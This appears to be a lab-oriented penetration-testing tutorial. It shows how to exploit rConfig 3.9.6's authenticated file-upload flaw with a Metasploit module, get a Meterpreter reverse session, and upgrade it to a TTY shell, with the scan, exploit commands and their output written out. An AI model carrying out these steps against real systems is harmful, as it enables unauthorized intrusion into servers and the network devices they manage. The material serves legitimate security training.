# Infiltrating Unix/Linux

Over 70% of publicly accessible web servers run on Unix-based operating systems, making Linux infiltration a critical skill for any penetration tester operating in enterprise environments. Organisations that host web applications on-premises present a particularly attractive target: a shell session on the underlying server can provide a pivot point deeper into the internal network, accessing systems and services that are unreachable from the public internet.

## Common Considerations

Before attempting exploitation on a Linux host, gathering context about the system informs both exploit selection and post-exploitation strategy. Key questions to address during enumeration:

- What Linux distribution is the system running?
- What shell interpreters and programming languages are present?
- What role does this system serve within the network environment?
- What application is it hosting, and what version is it running?
- Are there known CVEs or publicly available exploits for that application or its underlying stack?

## Enumerating the Host

Start with an **[Nmap](https://nmap.org/)** service and version scan to identify the open ports, running services, and stack versions:

```bash
nmap -sC -sV 10.129.201.101
```

Relevant output:

```
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
3306/tcp open  mysql    MySQL (unauthorized)
```

Several facts are immediately apparent from the scan: the host is a CentOS Linux system running an Apache 2.4.6 and PHP 7.2.34 web stack, with a MySQL database service and FTP exposed alongside SSH. Navigating to the host's IP address in a browser reveals the application: **[rConfig](https://www.rconfig.com/)**, an open source network device configuration management tool used by administrators to automate configuration pushes to routers, switches, and other network appliances. Compromising rConfig is a high-value objective because it typically holds administrative access to every managed network device in the environment.

## Discovering a Vulnerability in rConfig

The version number (3.9.6) is displayed at the bottom of the rConfig login page. Cross-referencing this version against public resources reveals an authenticated arbitrary file upload vulnerability in `/lib/crud/vendors.crud.php`, where the `vendorLogo` parameter accepts PHP files disguised as images. This vulnerability allows an authenticated attacker to upload a PHP web shell to a publicly accessible directory and achieve remote code execution as the `apache` user.

Metasploit's search function returns relevant modules:

```bash
msf6 > search rconfig
```

If the required module (`rconfig_vendors_auth_file_upload_rce.rb`) does not appear in the local MSF installation, retrieve it directly from the **[Rapid7 Metasploit Framework GitHub repository](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits)** and place it in the correct local directory:

```bash
locate exploits
# Target directory on Pwnbox:
# /usr/share/metasploit-framework/modules/exploits/linux/http/
```

Save the file with a `.rb` extension; all Metasploit modules are written in Ruby. Keep the local Metasploit installation current with:

```bash
apt update; apt install metasploit-framework
```

## Using the rConfig Exploit

Load the module and configure all required options for the target environment before running:

```bash
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit
```

The exploit executes the following steps automatically:

1. Checks the detected rConfig version against the vulnerable range
2. Authenticates to the rConfig web interface using the supplied credentials
3. Uploads a randomly named PHP payload file to `/images/vendor/`
4. Triggers the payload by requesting the uploaded file via HTTP
5. Deletes the PHP file from disk after execution
6. Returns a Meterpreter session

Successful execution output:

```
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable.
[+] We successfully logged in !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Triggering the payload ...
[+] Deleted olxapybdo.php
[*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860)
```

## Interacting with the Shell

Drop from the Meterpreter session into a native system shell:

```bash
meterpreter > shell

Process 3958 created.
Channel 0 created.
```

The session lands in the directory where the payload was uploaded and executed: `/home/rconfig/www/images/vendor`. The shell context is the `apache` user, which reflects the account under which the web server process runs.

## Spawning a TTY Shell with Python

The shell obtained through the payload is a non-TTY shell. This type of shell lacks a controlling terminal and blocks the use of commands that require one, including `su`, `sudo`, and any interactive application that reads directly from `/dev/tty`. Privilege escalation attempts will fail until a proper TTY is established.

Confirm whether Python is available on the system:

```bash
which python
```

If present, use Python's [pty module](https://docs.python.org/3/library/pty.html) to spawn a TTY-attached shell:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'

sh-4.2$ whoami
apache
```

The `sh-4.2$` prompt confirms a TTY shell is now active. The `pty.spawn` function creates a pseudoterminal pair and attaches `/bin/sh` to it, providing full terminal control. For a fully interactive TTY with job control, signal handling, and tab completion, background the shell with `Ctrl+Z`, configure the local terminal with `stty raw -echo`, return the shell to the foreground with `fg`, and set `export TERM=xterm` within the session.
